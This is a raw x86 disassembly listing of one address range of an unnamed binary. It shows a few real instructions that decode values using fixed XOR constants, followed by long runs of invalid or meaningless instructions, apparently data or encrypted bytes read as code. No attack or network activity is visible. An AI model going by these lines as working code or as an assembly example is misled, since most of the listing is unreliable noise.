  41e392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e394:	pop    es
  41e395:	shl    bh,0x79
  41e398:	popa   
  41e399:	(bad)  
  41e39a:	out    0x67,al
  41e39c:	test   al,0x47
  41e39e:	mov    edx,DWORD PTR [ebp-0x150]
  41e3a4:	xor    eax,0xcb79b576
  41e3a9:	xor    edx,0x9c2b8ae8
  41e3af:	mov    cl,0x3e
  41e3b1:	call   0x4223fa
  41e3b6:	or     edi,eax
  41e3b8:	or     ebx,edx
  41e3ba:	mov    eax,DWORD PTR [ebp-0x15c]
  41e3c0:	mov    edx,DWORD PTR [ebp-0x158]
  41e3c6:	xor    eax,0xcb79b576
  41e3cb:	xor    edx,0x9c2b8ae8
  41e3d1:	mov    cl,0x2
  41e3d3:	call   0x408bb8
  41e3d8:	mov    ecx,edx
  41e3da:	mov    edx,DWORD PTR [ebp-0x15c]
  41e3e0:	mov    DWORD PTR [ebp-0x228],esi
  41e3e6:	mov    esi,DWORD PTR [ebp-0x158]
  41e3ec:	xor    edx,0xcb79b576
  41e3f2:	xor    esi,0x9c2b8ae8
  41e3f8:	mov    DWORD PTR [ebp-0x22c],eax
  41e3fe:	mov    eax,edx
  41e400:	mov    edx,esi
  41e402:	mov    DWORD PTR [ebp-0x230],ecx
  41e408:	mov    cl,0x3e
  41e40a:	call   0x4223fa
  41e40f:	mov    esi,DWORD PTR [ebp-0x22c]
  41e415:	or     esi,eax
  41e417:	mov    eax,DWORD PTR [ebp-0x230]
  41e41d:	or     eax,edx
  41e41f:	push   eax
  41e420:	push   esi
  41e421:	jmp    0x41e808
  41e426:	rcl    BYTE PTR [ebp+0x47],cl
  41e429:	cmp    ecx,DWORD PTR [ebx+0x3b]
  41e42c:	mov    cl,0xb7
  41e42e:	scas   eax,DWORD PTR es:[edi]
  41e42f:	xor    ebx,DWORD PTR [ecx+edx*8]
  41e432:	ins    BYTE PTR es:[edi],dx
  41e433:	fdiv   st(6),st
  41e435:	fstp   QWORD PTR [edi+eiz*2]
  41e438:	sar    BYTE PTR [esi-0x41413bb6],0x9e
  41e43f:	dec    cl
  41e441:	mov    esi,?
  41e443:	inc    ebp
  41e444:	push   edi
  41e445:	add    DWORD PTR [ecx+ebx*2-0x68ca61c7],ecx
  41e44c:	dec    edi
  41e44d:	aaa    
  41e44e:	popa   
  41e44f:	dec    ecx
  41e450:	test   eax,0xdb93f82
  41e455:	imul   edx,DWORD PTR [edx],0xffffffc0
  41e458:	push   edx
  41e459:	mov    ebx,0x674959c8
  41e45e:	bound  edi,QWORD PTR [ebp-0x67]
  41e461:	adc    dh,BYTE PTR [ecx+0x57]
  41e464:	pop    esi
  41e465:	dec    ecx
  41e466:	sub    eax,0x21a5df36
  41e46b:	out    dx,al
  41e46c:	inc    eax
  41e46d:	dec    ebx
  41e46e:	lods   al,BYTE PTR ds:[esi]
  41e46f:	outs   dx,BYTE PTR ds:[esi]
  41e470:	add    al,0xc9
  41e472:	(bad)  
  41e473:	mov    ds:0x16b89a99,eax
  41e478:	sub    al,0x44
  41e47a:	fcomp  QWORD PTR [esi-0xb]
  41e47d:	test   edi,ecx
  41e47f:	mov    ah,dl
  41e481:	add    DWORD PTR [ebx],ebp
  41e483:	int3   
  41e484:	fwait
  41e485:	pop    ebp
  41e486:	mov    edi,0x7e910362
  41e48b:	jmp    0xc7cce8d
  41e490:	pop    edx
  41e491:	xor    DWORD PTR [ebx+ebx*1-0x5],ebx
  41e495:	ins    BYTE PTR es:[edi],dx
  41e496:	lahf   
  41e497:	sar    BYTE PTR ds:0x94193d87,1
  41e49d:	sbb    dl,BYTE PTR [ebx-0x57]
  41e4a0:	xlat   BYTE PTR ds:[ebx]
  41e4a1:	imul   esp,DWORD PTR [edx+esi*2+0x78ed81d3],0xa6d42d2d
  41e4ac:	jmp    0x41e517
  41e4ae:	hlt    
  41e4af:	or     eax,0xbdbcb7ad
  41e4b4:	and    eax,0xd315577
  41e4b9:	push   0x5b057609
  41e4be:	push   esi
  41e4bf:	scas   eax,DWORD PTR es:[edi]
  41e4c0:	test   al,0x18
  41e4c2:	sub    dl,ah
  41e4c4:	(bad)  
  41e4c5:	sti    
  41e4c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4c7:	inc    ecx
  41e4c8:	push   0x66c06167
  41e4cd:	xlat   BYTE PTR ds:[ebx]
  41e4ce:	add    DWORD PTR [ebx],ecx
  41e4d0:	jmp    0xf534:0xf409c2d6
  41e4d7:	aad    0x7d
  41e4d9:	mov    ah,0xd3
  41e4db:	mov    BYTE PTR [eax],cl
  41e4dd:	aaa    
  41e4de:	xor    BYTE PTR [ebx-0xfd15cf],0x1c
  41e4e5:	xor    esp,edx
  41e4e7:	loop   0x41e47c
  41e4e9:	jo     0x41e545
  41e4eb:	xlat   BYTE PTR ds:[ebx]
  41e4ec:	jno    0x41e4c5
  41e4ee:	dec    eax
  41e4ef:	in     al,0xa
  41e4f1:	jae    0x41e4d4
  41e4f3:	xor    BYTE PTR ds:0x6aa8b9fe,bl
  41e4f9:	sub    DWORD PTR [ebx+eiz*2+0x42],0x4887da19
  41e501:	pop    ss
  41e502:	mov    edx,0xad512c70
  41e507:	jecxz  0x41e4df
  41e509:	shl    eax,1
  41e50b:	jecxz  0x41e507
  41e50d:	lods   al,BYTE PTR ds:[esi]
  41e50e:	sub    cl,BYTE PTR [ecx-0x154888f2]
  41e514:	int3   
  41e515:	pop    edi
  41e516:	mov    ds,WORD PTR [ecx+esi*4+0x4b699d51]
  41e51d:	mov    ds:0xb1e09a59,al
  41e522:	loopne 0x41e4b5
  41e524:	imul   edx,DWORD PTR [ecx-0x2f],0xfc287c2
  41e52b:	inc    ecx
  41e52c:	(bad)  
  41e52d:	repz das 
  41e52f:	cld    
  41e530:	(bad)  
  41e532:	jecxz  0x41e59a
  41e534:	jo     0x41e4fe
  41e536:	test   BYTE PTR [esi+0x3],cl
  41e539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e53a:	add    edx,DWORD PTR [ecx]
  41e53c:	fsub   st,st(7)
  41e53e:	pop    ebx
  41e53f:	sti    
  41e540:	into   
  41e541:	lods   al,BYTE PTR ds:[esi]
  41e542:	idiv   DWORD PTR [esi+0x64]
  41e545:	add    DWORD PTR [edi+esi*8-0x58],0x1702edaa
  41e54d:	fcomp  QWORD PTR [ecx]
  41e54f:	cmp    al,BYTE PTR [eax+0x51]
  41e552:	inc    ebp
  41e553:	push   esi
  41e554:	pushf  
  41e555:	mov    al,0x5a
  41e557:	push   esi
  41e558:	mov    ebp,0x5c5e25f9
  41e55d:	cli    
  41e55e:	(bad)  
  41e55f:	cld    
  41e560:	sub    al,0xc9
  41e562:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e563:	aam    0x56
  41e565:	dec    edi
  41e566:	push   esi
  41e567:	addr16 adc ah,bh
  41e56a:	arpl   WORD PTR [edx-0x70],si
  41e56d:	mov    esp,0xf296dfb2
  41e572:	inc    esp
  41e573:	add    al,0x7a
  41e575:	cmp    edx,DWORD PTR [esi+0x31ed777]
  41e57b:	aaa    
  41e57c:	fadd   st(4),st
  41e57e:	clc    
  41e57f:	mul    BYTE PTR [esi+0x73]
  41e582:	(bad)  
  41e583:	in     eax,dx
  41e584:	mov    DWORD PTR [eax-0x1305cd92],ecx
  41e58a:	addr16 gs adc al,al
  41e58e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e58f:	std    
  41e590:	lahf   
  41e591:	shl    DWORD PTR [ecx-0x5c569b9f],0xd2
  41e598:	mov    ds:0xd1a4d4c9,eax
  41e59d:	or     al,cl
  41e59f:	lahf   
  41e5a0:	es sbb eax,0x332efcf7
  41e5a6:	ficom  WORD PTR ds:0x4969584c
  41e5ac:	icebp  
  41e5ad:	sbb    al,0x64
  41e5af:	fcomp  QWORD PTR [edi+0x5fef677e]
  41e5b5:	dec    eax
  41e5b6:	dec    esi
  41e5b7:	cmc    
  41e5b8:	call   0x98f66c91
  41e5bd:	jp     0x41e5d9
  41e5bf:	sahf   
  41e5c0:	fisttp WORD PTR [ecx]
  41e5c2:	loope  0x41e629
  41e5c4:	ins    DWORD PTR es:[edi],dx
  41e5c5:	fiadd  DWORD PTR [edx-0x76]
  41e5c8:	push   es
  41e5c9:	scas   al,BYTE PTR es:[edi]
  41e5ca:	jmp    0xe348:0x56ad19a0
  41e5d1:	(bad)  
  41e5d3:	mov    al,BYTE PTR [edi*8-0x42b3567c]
  41e5da:	retf   
  41e5db:	pop    ss
  41e5dc:	loope  0x41e602
  41e5de:	stos   DWORD PTR es:[edi],eax
  41e5df:	shl    DWORD PTR [edi],cl
  41e5e1:	and    BYTE PTR [ebx],bl
  41e5e3:	jb     0x41e62c
  41e5e5:	es in  al,0x62
  41e5e8:	inc    eax
  41e5e9:	es arpl WORD PTR gs:[esi],dx
  41e5ed:	cmp    eax,0x3fc58b0a
  41e5f2:	sub    ebp,DWORD PTR [ebp+0x3138160a]
  41e5f8:	xor    eax,0x67f48629
  41e5fd:	pushf  
  41e5fe:	jnp    0x41e5d5
  41e600:	out    0x29,al
  41e602:	in     al,0x85
  41e604:	pop    ecx
  41e605:	pop    esp
  41e606:	outs   dx,DWORD PTR ds:[esi]
  41e607:	call   0xb8098854
  41e60c:	test   eax,0x4da3b74e
  41e611:	retf   0x8d48
  41e614:	repz js 0x41e64a
  41e617:	loopne 0x41e642
  41e619:	and    al,0x4e
  41e61b:	xchg   edx,eax
  41e61c:	xchg   edi,eax
  41e61d:	cmc    
  41e61e:	sahf   
  41e61f:	lods   al,BYTE PTR ds:[esi]
  41e620:	lods   al,BYTE PTR ds:[esi]
  41e621:	aaa    
  41e622:	sbb    eax,0xf66086ad
  41e627:	hlt    
  41e628:	das    
  41e629:	int3   
  41e62a:	outs   dx,DWORD PTR ds:[esi]
  41e62b:	inc    eax
  41e62c:	loop   0x41e690
  41e62e:	dec    ecx
  41e62f:	scas   eax,DWORD PTR es:[edi]
  41e630:	xor    ebp,DWORD PTR [edx+0x7efd5fbf]
  41e636:	imul   ebx,DWORD PTR [ebx+0xa11b2c1],0xb5379fac
  41e640:	xchg   edx,eax
  41e641:	jo     0x41e6ba
  41e643:	pop    esp
  41e644:	mov    edx,cs
  41e646:	push   0xffffffbc
  41e648:	daa    
  41e649:	ss jmp 0xeb7c:0x1480b61b
  41e651:	lahf   
  41e652:	sbb    DWORD PTR [edi+0x576ce9c1],eax
  41e658:	sbb    al,0x4e
  41e65a:	fwait
  41e65b:	cmc    
  41e65c:	jae    0x41e690
  41e65e:	(bad)  
  41e65f:	fld    QWORD PTR [edi]
  41e661:	sub    al,0xb7
  41e663:	daa    
  41e664:	adc    al,0x3a
  41e666:	(bad)  
  41e667:	lea    esi,[esi+0x5]
  41e66a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e66b:	sbb    edx,DWORD PTR [ebx-0x11]
  41e66e:	mov    ah,0xcf
  41e670:	push   ebx
  41e671:	xor    bl,BYTE PTR [edx]
  41e673:	not    DWORD PTR [ecx]
  41e675:	es enter 0x6557,0x91
  41e67a:	fmul   QWORD PTR [esi]
  41e67c:	jcxz   0x41e641
  41e67f:	mov    dl,0x41
  41e681:	or     ecx,DWORD PTR [edi]
  41e683:	fild   WORD PTR [edi]
  41e685:	jge    0x41e619
  41e687:	sbb    eax,0xc05873f2
  41e68c:	push   esi
  41e68d:	int    0x31
  41e68f:	(bad)  
  41e690:	jo     0x41e68e
  41e692:	shl    DWORD PTR es:[edx+0x48528505],0xf6
  41e69a:	inc    edi
  41e69b:	xor    al,0xff
  41e69d:	dec    ebx
  41e69e:	stc    
  41e69f:	adc    DWORD PTR [ebx-0x77],esi
  41e6a2:	fsubr  DWORD PTR [ebx+ebp*8+0x1b]
  41e6a6:	retf   
  41e6a7:	cmp    eax,0x50755711
  41e6ac:	retf   
  41e6ad:	xchg   edx,eax
  41e6ae:	bound  edi,QWORD PTR [edx+edx*4-0x29]
  41e6b2:	xor    dh,BYTE PTR [eax-0x5ae0c6c]
  41e6b8:	jl     0x41e659
  41e6ba:	mov    ds:0xda9e21ae,al
  41e6bf:	imul   ecx,DWORD PTR [ecx-0x77],0x5610e2a1
  41e6c6:	pop    ebp
  41e6c7:	(bad)  
  41e6c8:	dec    ecx
  41e6c9:	test   bl,dl
  41e6cb:	inc    ecx
  41e6cc:	cmc    
  41e6cd:	fxch   st(5)
  41e6cf:	and    eax,0xecfa774a
  41e6d4:	loope  0x41e6c9
  41e6d6:	push   cs
  41e6d7:	push   ds
  41e6d8:	into   
  41e6d9:	mov    al,ds:0xc340788e
  41e6de:	mov    cl,BYTE PTR [eax+0x638be5b7]
  41e6e4:	add    BYTE PTR [eax+ecx*2-0x72],ch
  41e6e8:	and    al,0x65
  41e6ea:	and    BYTE PTR [ecx+0x2d],ch
  41e6ed:	lahf   
  41e6ee:	ins    BYTE PTR es:[edi],dx
  41e6ef:	add    esi,edi
  41e6f1:	mov    al,ds:0x9d03cc7a
  41e6f6:	and    BYTE PTR [edx+0x46bcaeb6],bl
  41e6fc:	mov    dl,0xf
  41e6fe:	gs hlt 
  41e700:	mov    BYTE PTR ds:0xed911b83,al
  41e706:	inc    edi
  41e707:	jno    0x41e6af
  41e709:	outs   dx,DWORD PTR ds:[esi]
  41e70a:	jo     0x41e768
  41e70c:	aad    0xed
  41e70e:	test   eax,0x5dd27ddd
  41e713:	jge    0x41e716
  41e715:	lods   eax,DWORD PTR ds:[esi]
  41e716:	mov    al,ds:0xdd8a3b44
  41e71b:	add    DWORD PTR [edi],edx
  41e71d:	xor    esp,DWORD PTR [esi+ebp*4]
  41e720:	mov    ?,WORD PTR [edi]
  41e722:	xchg   dh,al
  41e724:	ja     0x41e6ab
  41e726:	mov    WORD PTR [esi],gs
  41e728:	xchg   DWORD PTR [ebx-0x6f8fde49],esp
  41e72e:	sbb    al,0x7c
  41e730:	sub    DWORD PTR [eax],0xffffffbf
  41e733:	faddp  st(4),st
  41e735:	sbb    ebp,DWORD PTR [eax+0x34057aa4]
  41e73b:	jle    0x41e78d
  41e73d:	outs   dx,DWORD PTR ds:[esi]
  41e73e:	mov    al,0x6a
  41e740:	push   es
  41e741:	loop   0x41e6f8
  41e743:	sub    DWORD PTR [edi-0x24],esp
  41e746:	xchg   esi,eax
  41e747:	js     0x41e799
  41e749:	add    esp,ecx
  41e74b:	dec    ebx
  41e74c:	inc    edi
  41e74d:	imul   eax,DWORD PTR [ecx-0x1f3cbefe],0x29f09d16
  41e757:	xchg   edi,eax
  41e758:	leave  
  41e759:	fs mov esp,?
  41e75c:	jmp    0x9aa1e8d5
  41e761:	mov    gs,esp
  41e763:	arpl   sp,sp
  41e765:	mov    edx,0x457bd94a
  41e76a:	xchg   ebx,eax
  41e76b:	mov    ds:0x9906457f,eax
  41e770:	pop    ebp
  41e771:	pop    ss
  41e772:	adc    al,0x64
  41e774:	push   ebx
  41e775:	lahf   
  41e776:	jnp    0x41e752
  41e778:	jno    0x41e7d1
  41e77a:	push   esi
  41e77b:	and    DWORD PTR [edi],ebx
  41e77d:	sbb    eax,0xef3ce4a5
  41e782:	dec    ecx
  41e783:	loope  0x41e7a9
  41e785:	push   ecx
  41e786:	(bad)  
  41e787:	arpl   si,dx
  41e789:	adc    BYTE PTR [edx-0x1a055d18],0xcb
  41e790:	lea    eax,[eax]
  41e792:	or     cl,dh
  41e794:	xchg   ebx,eax
  41e795:	inc    edi
  41e796:	out    dx,eax
  41e797:	jb     0x41e74d
  41e799:	cli    
  41e79a:	sbb    BYTE PTR [ebx-0x5eb6c61d],0x49
  41e7a1:	sbb    DWORD PTR [esi],edx
  41e7a3:	cwde   
  41e7a4:	xchg   ebp,eax
  41e7a5:	stc    
  41e7a6:	fld    TBYTE PTR [eax]
  41e7a8:	and    DWORD PTR [edi+ebp*8-0xe14bc08],ebp
  41e7af:	stc    
  41e7b0:	mov    eax,0x2b67d84b
  41e7b5:	cmc    
  41e7b6:	jnp    0x41e827
  41e7b8:	xor    DWORD PTR [edx*4+0x407536ca],eax
  41e7bf:	fwait
  41e7c0:	pop    ebp
  41e7c1:	cli    
  41e7c2:	and    bl,bl
  41e7c4:	pushf  
  41e7c5:	adc    al,al
  41e7c7:	aad    0xa3
  41e7c9:	add    bh,ch
  41e7cb:	sbb    DWORD PTR [esi-0x7cc3282c],ebp
  41e7d1:	data16 cld 
  41e7d3:	mov    esi,0xa07eebfc
  41e7d8:	sub    eax,0xb4afe43
  41e7dd:	scas   eax,DWORD PTR es:[edi]
  41e7de:	fs pushf 
  41e7e0:	arpl   WORD PTR [edi+0x5856868f],ax
  41e7e6:	pop    ebx
  41e7e7:	icebp  
  41e7e8:	lahf   
  41e7e9:	scas   al,BYTE PTR es:[edi]
  41e7ea:	xchg   edi,eax
  41e7eb:	jmp    0xf46ee2a7
  41e7f0:	pop    esi
  41e7f1:	out    0x4c,eax
  41e7f3:	(bad)  
  41e7f4:	loope  0x41e85d
  41e7f6:	iret   
  41e7f7:	dec    edx
  41e7f8:	mov    ?,ecx
  41e7fa:	pop    eax
  41e7fb:	dec    eax
  41e7fc:	es cwde 
  41e7fe:	dec    edi
  41e7ff:	mov    ebx,0x1bc2a936
  41e804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e805:	jle    0x41e865
  41e807:	pop    eax
  41e808:	push   ebx
  41e809:	push   edi
  41e80a:	call   0x41594e
  41e80f:	mov    esi,DWORD PTR [ebp-0x228]
  41e815:	cmp    esi,eax
  41e817:	jmp    0x41ebfe
  41e81c:	mov    dh,0x8
  41e81e:	xor    al,0xa5
  41e820:	mov    ah,0xb9
  41e822:	mov    esp,0xddc4c918
  41e827:	nop
  41e828:	mov    ecx,0xa7d15aa5
  41e82d:	outs   dx,DWORD PTR ds:[esi]
  41e82e:	sar    BYTE PTR [esi-0x41413bb6],0x65
  41e835:	pop    ecx
  41e836:	cmp    ebx,ecx
  41e838:	dec    eax
  41e839:	mov    ?,edx
  41e83b:	push   ds
  41e83c:	jns    0x41e85a
  41e83e:	rcr    DWORD PTR [eax],1
  41e840:	xchg   ebp,eax
  41e841:	adc    DWORD PTR [ecx],ebx
  41e843:	cmp    BYTE PTR [ebp+0x2c],0x42
  41e847:	into   
  41e848:	pop    ecx
  41e849:	mov    BYTE PTR [edi-0x4660de2b],dh
  41e84f:	mov    esp,0x139f6b43
  41e854:	cmp    eax,0x871f7516
  41e859:	popf   
  41e85a:	loopne 0x41e8a3
  41e85c:	jbe    0x41e870
  41e85e:	adc    ch,dl
  41e860:	push   edx
  41e861:	mov    eax,ds:0xd1053a02
  41e866:	push   edi
  41e867:	mov    bh,0x35
  41e869:	(bad)  
  41e86a:	sbb    eax,0x19724fb0
  41e86f:	pop    es
  41e870:	xchg   ecx,eax
  41e871:	clc    
  41e872:	cld    
  41e873:	lods   al,BYTE PTR ds:[esi]
  41e874:	not    edi
  41e876:	push   ebp
  41e878:	pop    esi
  41e879:	out    0x2b,al
  41e87b:	(bad)  
  41e87c:	pop    esi
  41e87d:	dec    edx
  41e87e:	jne    0x41e8b9
  41e880:	mul    bh
  41e882:	dec    edx
  41e883:	or     BYTE PTR [ebx],0xa4
  41e886:	mov    edi,0xcc319d87
  41e88b:	jmp    0xf848d8
  41e890:	retf   
  41e891:	sbb    bh,BYTE PTR [ebp-0x26]
  41e894:	sub    al,0x24
  41e896:	ror    DWORD PTR [esi+0x7d7f4343],cl
  41e89c:	test   al,0x42
  41e89e:	pop    esp
  41e89f:	aad    0xad
  41e8a1:	sub    al,0x2c
  41e8a3:	ja     0x41e91e
  41e8a5:	jmp    0x5c49:0x168561c0
  41e8ac:	les    edx,FWORD PTR [ebx+0x18]
  41e8af:	sbb    edx,edx
  41e8b1:	xchg   edx,eax
  41e8b2:	mov    BYTE PTR [eax+0x1d],bl
  41e8b5:	call   0xb6a85ee5
  41e8ba:	jp     0x41e894
  41e8bc:	fdiv   st,st(5)
  41e8be:	and    BYTE PTR [edi+0x50],ah
  41e8c1:	out    dx,al
  41e8c2:	push   edx
  41e8c3:	dec    eax
  41e8c4:	int3   
  41e8c5:	mov    ebp,0x5e591e47
  41e8ca:	test   bl,0x67
  41e8cd:	ret    
  41e8ce:	pop    edi
  41e8cf:	cmp    DWORD PTR [ecx-0x656e53ec],ecx
  41e8d5:	or     dh,dl
  41e8d7:	into   
  41e8d8:	mov    ebx,0x87cfe47f
  41e8dd:	pusha  
  41e8de:	das    
  41e8df:	inc    eax
  41e8e0:	jle    0x41e935
  41e8e2:	push   edi
  41e8e3:	daa    
  41e8e4:	dec    esi
  41e8e5:	or     eax,0x246173b4
  41e8ea:	cdq    
  41e8eb:	fsubrp st(3),st
  41e8ed:	adc    eax,0xe2c1a9c8
  41e8f2:	and    al,0xed
  41e8f4:	pop    ecx
  41e8f5:	in     eax,0xe
  41e8f7:	xchg   ebp,eax
  41e8f8:	lahf   
  41e8f9:	jmp    0x47f9:0x5f522207
  41e900:	jb     0x41e8e2
  41e902:	out    dx,eax
  41e903:	out    0x3d,al
  41e905:	add    edx,DWORD PTR [edi-0x603b424]
  41e90b:	add    ebp,DWORD PTR [edx]
  41e90d:	arpl   WORD PTR [edx],cx
  41e90f:	dec    esi
  41e910:	xor    DWORD PTR [esi],ebx
  41e912:	add    cl,bl
  41e914:	adc    al,0x4
  41e916:	mov    ecx,?
  41e918:	enter  0x61cf,0x4f
  41e91c:	pop    ds
  41e91d:	fs mov edx,0xaf0d5282
  41e923:	not    DWORD PTR [esi]
  41e925:	(bad)  
  41e926:	mov    ebp,0x2cb6b612
  41e92b:	icebp  
  41e92c:	push   ebx
  41e92d:	and    al,0x4d
  41e92f:	xchg   ecx,eax
  41e930:	xchg   ebp,eax
  41e931:	aad    0x8b
  41e933:	cmp    al,0xa9
  41e935:	mov    DWORD PTR [ebp+0x5d],0x7ecf2788
  41e93c:	inc    ebp
  41e93d:	sub    eax,0x384f5f87
  41e942:	and    ebp,ecx
  41e944:	xor    ax,0xff93
  41e948:	mov    cl,0x2a
  41e94a:	jns    0x41e8d0
  41e94c:	int3   
  41e94d:	and    eax,0xf8fc3c30
  41e952:	add    al,0xfb
  41e954:	js     0x41e989
  41e956:	(bad)  
  41e957:	pop    ss
  41e958:	fsubr  QWORD PTR [esi-0x34]
  41e95b:	mov    ebx,0x643d2e39
  41e960:	mov    esi,0x2b3e84c0
  41e965:	js     0x41e9e1
  41e967:	inc    edx
  41e968:	push   edx
  41e969:	inc    edi
  41e96a:	or     BYTE PTR [esi+0x7b],ah
  41e96d:	mov    edx,0x6d8463a8
  41e972:	push   cs
  41e973:	rcl    BYTE PTR [edx],cl
  41e975:	clc    
  41e976:	jge    0x41e938
  41e978:	sub    ah,ch
  41e97a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e97b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e97c:	push   ds
  41e97d:	sbb    ah,cl
  41e97f:	ins    DWORD PTR es:[edi],dx
  41e980:	jmp    0x41e9ad
  41e982:	mov    al,ds:0x6891dfe8
  41e987:	adc    BYTE PTR [ebx-0x158b25c9],cl
  41e98d:	sbb    BYTE PTR [edx],0x57
  41e990:	inc    ebp
  41e991:	jo     0x41e9b1
  41e993:	add    dl,BYTE PTR [edx+0x7c31eb2f]
  41e999:	sbb    DWORD PTR [edi],0x10
  41e99c:	repnz sub esp,esi
  41e99f:	sbb    eax,0xfdb51e04
  41e9a4:	imul   ebx,esi,0x2fa6ce55
  41e9aa:	mov    ebx,0x1af206ad
  41e9af:	popf   
  41e9b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9b1:	scas   al,BYTE PTR es:[edi]
  41e9b2:	jg     0x41e9fb
  41e9b4:	fisub  WORD PTR [ebx+0x59a21d05]
  41e9ba:	paddb  mm4,QWORD PTR [edx+edx*1-0x69]
  41e9bf:	cmp    edx,DWORD PTR [esi+0x5a]
  41e9c2:	pushf  
  41e9c3:	loop   0x41e9c4
  41e9c5:	sbb    dh,0xff
  41e9c8:	push   0xffffffdc
  41e9ca:	xor    edi,DWORD PTR [esi+0x21]
  41e9cd:	push   esi
  41e9ce:	jp     0x41e999
  41e9d0:	sbb    al,0x40
  41e9d2:	test   BYTE PTR [ecx+0x4f21a6ce],dl
  41e9d8:	std    
  41e9d9:	pusha  
  41e9da:	or     eax,0x12c77ed3
  41e9df:	fldenv [edi+0x54]
  41e9e2:	jb     0x41e9be
  41e9e4:	daa    
  41e9e5:	jmp    DWORD PTR [ecx]
  41e9e7:	inc    esp
  41e9e8:	test   ch,0x64
  41e9eb:	dec    esp
  41e9ec:	and    DWORD PTR [esi-0x4],esp
  41e9ef:	mov    ah,0xae
  41e9f1:	and    bh,BYTE PTR [ebx-0x7]
  41e9f4:	pop    ecx
  41e9f5:	fsubrp st(2),st
  41e9f7:	je     0x41ea10
  41e9f9:	je     0x41e9fc
  41e9fb:	add    DWORD PTR [ebx+0x5661018c],eax
  41ea01:	sbb    dl,BYTE PTR [ebx+eax*8]
  41ea04:	adc    bl,bl
  41ea06:	stc    
  41ea07:	inc    edi
  41ea08:	lods   eax,DWORD PTR ds:[esi]
  41ea09:	fdiv   st(6),st
  41ea0b:	mov    al,0x1
  41ea0d:	xchg   ecx,eax
  41ea0e:	daa    
  41ea0f:	jg     0x41ea25
  41ea11:	(bad)  
  41ea12:	int    0xc5
  41ea14:	call   0xb92f:0xc00144ba
  41ea1b:	test   al,0xb2
  41ea1d:	ins    BYTE PTR es:[edi],dx
  41ea1e:	js     0x41ea22
  41ea20:	rcl    esi,0xaf
  41ea23:	cmp    al,0xac
  41ea25:	hlt    
  41ea26:	xchg   cl,dl
  41ea28:	add    cl,cl
  41ea2a:	cdq    
  41ea2b:	mov    es,esi
  41ea2d:	cld    
  41ea2e:	dec    edx
  41ea2f:	arpl   WORD PTR [edx+0x12],cx
  41ea32:	push   0x7c
  41ea34:	mov    al,ds:0xb52eb9ce
  41ea39:	sbb    BYTE PTR [ebx+esi*8],bh
  41ea3c:	jle    0x41eab9
  41ea3e:	das    
  41ea3f:	rol    DWORD PTR [edi+0x5d052c90],cl
  41ea45:	mul    esi
  41ea47:	call   0x6daba986
  41ea4c:	and    BYTE PTR [ecx],al
  41ea4e:	sbb    eax,0x9122e3c4
  41ea53:	fs into 
  41ea55:	xchg   esi,eax
  41ea56:	mov    ecx,DWORD PTR [edi-0xf564f6e]
  41ea5c:	push   0x62f88753
  41ea61:	ss push eax
  41ea63:	ficom  DWORD PTR [ecx+esi*1+0x56]
  41ea67:	adc    eax,0xf1ab107c
  41ea6c:	call   0x3e41b867
  41ea71:	fild   QWORD PTR [ecx]
  41ea73:	clc    
  41ea74:	cmp    eax,0x581fc35e
  41ea79:	push   0xffffffbb
  41ea7b:	xor    BYTE PTR ds:0xd05a069f,ah
  41ea81:	sbb    ah,BYTE PTR [ebx+edx*1+0x96f75c8]
  41ea88:	inc    esp
  41ea89:	fdiv   st(5),st
  41ea8b:	pop    esp
  41ea8c:	outs   dx,BYTE PTR ds:[esi]
  41ea8d:	mov    bl,0x7c
  41ea8f:	inc    ebx
  41ea90:	jne    0x41eaed
  41ea92:	inc    esi
  41ea93:	retf   0x32c6
  41ea96:	into   
  41ea97:	xchg   BYTE PTR [esi+0x3a582520],bl
  41ea9d:	lock xchg ebx,eax
  41ea9f:	sub    eax,DWORD PTR [edi]
  41eaa1:	shl    DWORD PTR [edi-0x74f21fa5],0xfe
  41eaa8:	mov    BYTE PTR [esi-0x505835b7],dh
  41eaae:	mov    ss,WORD PTR [eax+ecx*1-0x54e4e22c]
  41eab5:	mov    cl,0x36
  41eab7:	out    dx,al
  41eab8:	push   edi
  41eab9:	sub    esi,ebx
  41eabb:	in     eax,0x92
  41eabd:	pop    edi
  41eabe:	push   ecx
  41eac0:	or     al,0xf9
  41eac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eac3:	daa    
  41eac4:	push   eax
  41eac5:	arpl   WORD PTR [ebx+0x3d],ax
  41eac8:	push   ebx
  41eac9:	sahf   
  41eaca:	xchg   ebp,eax
  41eacb:	retf   
  41eacc:	cdq    
  41eacd:	pop    ss
  41eace:	and    DWORD PTR [ebp-0x71a16d1f],edi
  41ead4:	mov    ebx,0x62be65de
  41ead9:	or     al,0x1e
  41eadb:	fcomp  DWORD PTR [ebp-0x29]
  41eade:	push   ss
  41eadf:	cli    
  41eae0:	pop    esi
  41eae1:	fisub  DWORD PTR [ebp-0x134a750b]
  41eae7:	inc    ecx
  41eae8:	inc    ebx
  41eae9:	xor    bl,bh
  41eaeb:	out    dx,al
  41eaec:	test   DWORD PTR [ebp-0x65],edx
  41eaef:	gs stc 
  41eaf1:	mov    ah,0xb6
  41eaf3:	ds dec ebp
  41eaf5:	add    edi,ebp
  41eaf7:	xor    eax,esp
  41eaf9:	iret   
  41eafa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eafb:	push   ds
  41eafc:	push   ebp
  41eafd:	int    0xf5
  41eaff:	inc    ecx
  41eb00:	adc    eax,0x70ebe047
  41eb05:	test   eax,0x111e8668
  41eb0a:	jnp    0x41eb25
  41eb0c:	jp     0x41eb64
  41eb0e:	and    al,0x28
  41eb10:	aas    
  41eb11:	std    
  41eb12:	pop    edi
  41eb13:	cwde   
  41eb14:	in     al,dx
  41eb15:	imul   esi,ebx,0xd900ff
  41eb1b:	imul   esp,DWORD PTR [eax],0x449e9fb9
  41eb21:	loopne 0x41eb37
  41eb23:	cs mov al,0x95
  41eb26:	mov    ebp,ds
  41eb28:	sti    
  41eb29:	jle    0x41eb7f
